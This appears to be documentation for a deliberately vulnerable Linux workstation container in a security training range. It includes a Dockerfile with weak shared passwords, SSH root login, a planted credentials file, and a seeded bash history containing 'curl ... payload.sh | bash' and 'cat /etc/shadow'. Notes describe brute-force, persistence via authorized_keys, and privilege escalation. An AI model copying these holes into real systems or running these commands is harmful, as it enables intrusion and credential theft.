# dockerfiles/wks-linux/ — Linux Workstation

wks-linux is an Ubuntu 24.04 container simulating a corporate Linux workstation. It hosts user accounts (`devuser`, `sysadmin`) that are targets for credential harvesting, lateral movement, and persistence scenarios.

**Container:** wks-linux  
**Control IP:** 10.0.0.100  
**Users segment IP:** 10.30.30.10  
**Exposed services:** SSH :22

---

## Files

| File | Purpose |
|------|---------|
| `Dockerfile` | Ubuntu 24.04 + user accounts + Wazuh agent + Saffron agent |
| `entrypoint.sh` | Wazuh enrollment, Saffron start, SSH daemon |

---

## Dockerfile

```dockerfile
FROM ubuntu:24.04

ARG WAZUH_VERSION=4.9.2
ARG RANGE_PASSWORD=P@55w0rd!
ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
    openssh-server \
    sudo \
    vim \
    curl wget \
    git \
    python3 python3-pip \
    net-tools iputils-ping \
    rsyslog \
    bash-completion \
    htop \
    tmux \
    && rm -rf /var/lib/apt/lists/*

# Wazuh agent
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add - && \
    echo "deb https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list && \
    apt-get update && apt-get install -y wazuh-agent=${WAZUH_VERSION}-1 && \
    rm -rf /var/lib/apt/lists/*

# Saffron agent
COPY saffron-agent-linux-amd64 /usr/bin/saffron-agent
RUN chmod +x /usr/bin/saffron-agent

# User accounts
RUN useradd -m -s /bin/bash devuser && \
    echo "devuser:${RANGE_PASSWORD}" | chpasswd && \
    useradd -m -s /bin/bash sysadmin && \
    echo "sysadmin:${RANGE_PASSWORD}" | chpasswd && \
    usermod -aG sudo sysadmin

# SSH configuration
RUN mkdir /var/run/sshd && \
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Credential artifacts (intentional — for scenario realism)
# devuser has a bash_history with interesting commands
RUN echo 'ssh sysadmin@10.0.0.5\ncat /etc/shadow\nsudo su -\ncurl http://10.0.0.1/payload.sh | bash' \
    > /home/devuser/.bash_history && chown devuser:devuser /home/devuser/.bash_history

# sysadmin has a plaintext credentials file in home directory
RUN echo "DB connection string: mssql+pymssql://sa:${RANGE_PASSWORD}@10.40.40.10:1433/RangeDB" \
    > /home/sysadmin/db-connection.txt && \
    echo "Wazuh API: https://10.0.0.7 admin / ${RANGE_PASSWORD}" >> /home/sysadmin/db-connection.txt && \
    chown sysadmin:sysadmin /home/sysadmin/db-connection.txt && \
    chmod 600 /home/sysadmin/db-connection.txt

# SSH authorized keys (devuser can SSH to itself — placeholder for scenario-injected keys)
RUN mkdir -p /home/devuser/.ssh && chmod 700 /home/devuser/.ssh && \
    touch /home/devuser/.ssh/authorized_keys && \
    chmod 600 /home/devuser/.ssh/authorized_keys && \
    chown -R devuser:devuser /home/devuser/.ssh

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 22
ENTRYPOINT ["/entrypoint.sh"]
```

---

## entrypoint.sh

```bash
#!/usr/bin/env bash
set -euo pipefail

# Saffron agent
saffron-agent --server "${COMMANDLY_SERVER:-http://10.0.0.1:8080}" --hostname wks-linux &

# Wazuh enrollment
/var/ossec/bin/agent-auth \
    -m "${WAZUH_MANAGER:-10.0.0.5}" \
    -P "${WAZUH_ENROLLMENT_PSK}" \
    -A "wks-linux"
/var/ossec/bin/wazuh-control start

# syslog forwarding
echo "*.* @10.50.50.8:514" >> /etc/rsyslog.conf
rsyslogd

# SSH daemon (foreground via exec to be PID 1's child)
exec /usr/sbin/sshd -D
```

---

## Attack Surface Notes

- **Credential artifacts in home directories:** `devuser/.bash_history` contains commands that reveal internal network knowledge (useful for DFIR training — analysts can trace what the machine was used for)
- **sysadmin `.db-connection.txt`:** Plaintext credentials file — simulates a developer leaving credentials on disk. Target for credential harvesting in post-exploitation scenarios.
- **SSH password auth enabled:** Allows brute-force scenarios (Hydra/Medusa from scenario container against `devuser`)
- **`authorized_keys` writable by Saffron:** Scenario phases can inject a public key to simulate persistence via SSH backdoor (`runcmd.bash wks-linux "echo 'ssh-rsa AAAA...' >> /home/devuser/.ssh/authorized_keys"`)
- **sudo access for sysadmin:** Allows privilege escalation from `devuser` → `sysadmin` → `root` via credential reuse

---

## Domain Join (Optional)

For scenarios requiring `wks-linux` to be domain-joined to `secure.net`:

```bash
# Install realm + sssd in Dockerfile
apt-get install -y realmd sssd sssd-tools sssd-ad adcli

# At container start (if AD_DOMAIN env var is set)
if [[ -n "${AD_DOMAIN:-}" ]]; then
    echo "${RANGE_PASSWORD}" | realm join \
        --user Administrator \
        --computer-ou "OU=LinuxWorkstations,DC=secure,DC=net" \
        "${AD_DOMAIN}"
fi
```

Domain join is optional and controlled by the `AD_DOMAIN` environment variable. When joined, the machine appears in AD and domain user logins work over SSH (`ssh jsmith@10.30.30.10`).
